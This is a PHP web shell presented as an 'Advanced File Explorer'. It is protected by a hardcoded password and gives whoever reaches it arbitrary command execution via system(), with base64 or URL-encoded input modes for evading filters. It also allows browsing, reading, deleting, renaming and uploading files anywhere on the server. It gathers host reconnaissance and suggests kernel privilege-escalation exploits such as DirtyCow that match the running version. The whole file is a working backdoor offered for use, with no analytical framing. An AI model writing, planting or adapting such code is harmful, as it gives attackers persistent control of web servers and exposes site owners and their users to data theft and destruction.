<?php
// Security headers
header('Content-Type: text/html; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// Authentication
define('ACCESS_KEY','LEETS');
session_start();

if(!isset($_SESSION['auth']) && (!isset($_POST['pass']) || $_POST['pass'] !== ACCESS_KEY)) {
    echo '<!DOCTYPE html><html><body>
    <form method="post">
    <input type="password" name="pass" placeholder="Access Key">
    <button>Authenticate</button>
    </form></body></html>';
    exit;
}

$_SESSION['auth'] = true;

// System Information Functions
function getSystemInfo() {
    $info = [];
    
    // Basic system info
    $info['php_version'] = phpversion();
    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['user'] = get_current_user();
    $info['disabled_functions'] = ini_get('disable_functions') ?: 'None';
    
    // Kernel info (Linux only)
    if(strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
        $info['os'] = php_uname('s');
        $info['hostname'] = php_uname('n');
        $info['kernel'] = php_uname('r');
        
        // Kernel exploit suggestions
        $kernelVersion = $info['kernel'];
        $exploits = [];
        
        if(version_compare($kernelVersion, '3.9.0', '<=')) {
            $exploits[] = 'CVE-2014-0038 (timeoutpwn)';
        }
        if(version_compare($kernelVersion, '3.13.0', '<=')) {
            $exploits[] = 'CVE-2015-1328 (overlayfs)';
        }
        if(version_compare($kernelVersion, '4.4.0', '<=')) {
            $exploits[] = 'CVE-2016-5195 (DirtyCow)';
        }
        
        $info['potential_exploits'] = $exploits ? implode(', ', $exploits) : 'None identified';
    }
    
    // Domain/IP information
    $info['server_ip'] = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $info['domains_on_ip'] = gethostbynamel($_SERVER['HTTP_HOST']) ?: ['N/A'];
    
    return $info;
}

// File system functions
function scanDirSafe($path) {
    return is_readable($path) ? array_diff(scandir($path), ['.','..']) : false;
}

function fileReadSafe($path) {
    return is_readable($path) ? file_get_contents($path) : false;
}

// Generate clickable breadcrumbs
function breadcrumbs($path) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumbs = [];
    $currentPath = '';
    
    foreach($parts as $part) {
        $currentPath .= '/' . $part;
        $breadcrumbs[] = '<a href="?dir='.urlencode($currentPath).'">'.htmlspecialchars($part).'</a>';
    }
    
    return implode(' / ', $breadcrumbs);
}

// Main interface
echo '<!DOCTYPE html>
<html>
<head>
    <title>Advanced File Explorer</title>
    <style>
        body {font-family: sans-serif; margin:0; padding:0}
        .sysinfo {background:#333; color:#fff; padding:10px; font-size:12px}
        .panel {background:#f5f5f5; padding:10px; margin:5px 0}
        pre {background:#eee; padding:10px; overflow:auto}
        .breadcrumb {background:#ddd; padding:5px 10px}
        table {width:100%; border-collapse:collapse}
        th {background:#333; color:#fff; text-align:left; padding:5px}
        td {padding:5px; border-bottom:1px solid #ddd}
        a {text-decoration:none; color:#0066cc}
        a:hover {text-decoration:underline}
    </style>
</head>
<body>';

// Display system information
$sysinfo = getSystemInfo();
echo '<div class="sysinfo">
    <strong>System Information:</strong><br>
    PHP: '.$sysinfo['php_version'].' | 
    User: '.$sysinfo['user'].' | 
    OS: '.($sysinfo['os'] ?? 'N/A').'<br>
    Kernel: '.($sysinfo['kernel'] ?? 'N/A').' | 
    Potential Exploits: '.($sysinfo['potential_exploits'] ?? 'N/A').'<br>
    Server IP: '.$sysinfo['server_ip'].' | 
    Domains on IP: '.implode(', ', $sysinfo['domains_on_ip']).'
</div>';

// Current directory handling
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
echo '<div class="breadcrumb">
    <strong>Path:</strong> /'.breadcrumbs($currentDir).'
</div>';

// File operations panel
echo '<div class="panel">
    <form method="get" style="display:inline">
        <input type="text" name="dir" placeholder="Enter path" value="'.htmlspecialchars($currentDir).'" style="width:300px">
        <button>Go</button>
    </form>
    <form method="post" enctype="multipart/form-data" style="display:inline; margin-left:20px">
        <input type="file" name="uploadfile">
        <button>Upload</button>
    </form>
</div>';

// File listing
if(is_dir($currentDir)) {
    echo '<div class="panel"><table>
        <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>';
    
	$items = scanDirSafe($currentDir);

	// Pisahin folder & file
	$dirs = $files = [];

	foreach ($items as $item) {
		$fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
		if (is_dir($fullPath)) {
			$dirs[] = $item;
		} else {
			$files[] = $item;
		}
	}

	// Sort A-Z natural case-insensitive
	natcasesort($dirs);
	natcasesort($files);

	// Gabungin lagi
	$sortedItems = array_merge($dirs, $files);

	foreach ($sortedItems as $item) {
        $fullPath = $currentDir.DIRECTORY_SEPARATOR.$item;
        $isDir = is_dir($fullPath);
        $size = $isDir ? '-' : round(filesize($fullPath)/1024, 2).' KB';
        $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
        
        echo '<tr>
            <td>';
        if($isDir) {
            echo '📁 <a href="?dir='.urlencode($fullPath).'">'.htmlspecialchars($item).'</a>';
        } else {
            echo '📄 <a href="?dir='.urlencode($currentDir).'&view='.urlencode($fullPath).'">'.htmlspecialchars($item).'</a>';
        }
        echo '</td>
            <td>'.$size.'</td>
            <td>'.$perms.'</td>
            <td>
                <a href="?dir='.urlencode($currentDir).'&delete='.urlencode($fullPath).'">Delete</a> |
                <a href="?dir='.urlencode($currentDir).'&rename='.urlencode($item).'">Rename</a> |
                <a href="?dir='.urlencode($currentDir).'&download='.urlencode($fullPath).'">Download</a>
            </td>
        </tr>';
    }
    echo '</table></div>';
}

// File viewing/download
if(isset($_GET['view']) && is_file($_GET['view'])) {
    echo '<div class="panel"><pre>'.htmlspecialchars(fileReadSafe($_GET['view'])).'</pre></div>';
}

// Command execution panel
echo '<div class="panel">
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" style="width:70%">
        <select name="mode">
            <option value="1">Normal</option>
            <option value="2">Base64</option>
            <option value="3">URL Encoded</option>
        </select>
        <button>Execute</button>
    </form>
</div>';

// Handle command execution
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $mode = $_POST['mode'] ?? 1;
    
    if($mode == 2) {
        $cmd = base64_decode($cmd);
    } elseif($mode == 3) {
        $cmd = urldecode($cmd);
    }
    
    echo '<div class="panel"><pre>';
    system($cmd);
    echo '</pre></div>';
}

echo '</body></html>';

// Handle file operations
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(is_dir($file)) {
        rmdir($file);
    } else {
        unlink($file);
    }
    header('Location: ?dir='.urlencode($currentDir));
}

if(isset($_GET['rename']) && isset($_POST['newname'])) {
    rename($currentDir.DIRECTORY_SEPARATOR.$_GET['rename'], $currentDir.DIRECTORY_SEPARATOR.$_POST['newname']);
    header('Location: ?dir='.urlencode($currentDir));
}

if(isset($_FILES['uploadfile'])) {
    $target = $currentDir.DIRECTORY_SEPARATOR.basename($_FILES['uploadfile']['name']);
    move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target);
    header('Location: ?dir='.urlencode($currentDir));
}
?>